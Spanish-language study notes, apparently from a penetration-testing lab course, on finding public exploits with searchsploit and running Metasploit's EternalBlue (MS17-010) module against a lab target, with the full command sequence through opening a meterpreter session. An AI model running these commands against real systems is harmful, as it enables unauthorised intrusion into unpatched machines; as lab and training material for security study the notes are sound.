# Apuntes resumidos: Hazañas públicas (Exploits)

## 1) Encontrar exploits públicos (rápido)
- Busca por **app + versión + exploit/CVE** en Google y revisa Exploit-DB, Rapid7, Vulnerability Lab.
- Usa **Exploit-DB (searchsploit)** en local.

Instalar/actualizar base de exploits:
```bash
sudo apt install exploitdb -y
searchsploit -u
```

Buscar por nombre/versión y trabajar con PoCs:
```bash
searchsploit openssh 7.2
searchsploit -x linux/remote/45233.py     # ver PoC
searchsploit -m linux/remote/45233.py     # copiar PoC al directorio actual
```

## 2) Metasploit: flujo mínimo
Abrir consola:
```bash
msfconsole
```

Buscar y cargar módulo de exploit:
```bash
search eternalblue
use exploit/windows/smb/ms17_010_psexec
show options
```

Configurar objetivo/handler:
```bash
set RHOSTS 10.10.10.40
set RPORT 445          # si aplica
set LHOST tun0         # o tu IP
```

Comprobar vulnerabilidad (si el módulo lo soporta):
```bash
check
```

Lanzar exploit y gestionar sesión:
```bash
exploit
sessions -i 1
```

Comandos útiles en meterpreter/shell:
```bash
getuid
sysinfo
shell
whoami
```

## 3) Ejemplo rápido (MS17-010)
```bash
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.40
set LHOST tun0
check
exploit
```

## 4) Apuntes clave
- **Correlaciona versión de servicio ↔ CVE/exploit** antes de lanzar nada; evita falsos positivos/ruido.
- **Revisa módulos auxiliary/scanner** para validar sin explotar.
- **No dependas solo de MSF**: si falla, usa PoCs de searchsploit/manuales y ajusta 🙂.
- **Registra** lo que pruebas (versión, CVE, resultado) para repetir y reportar.
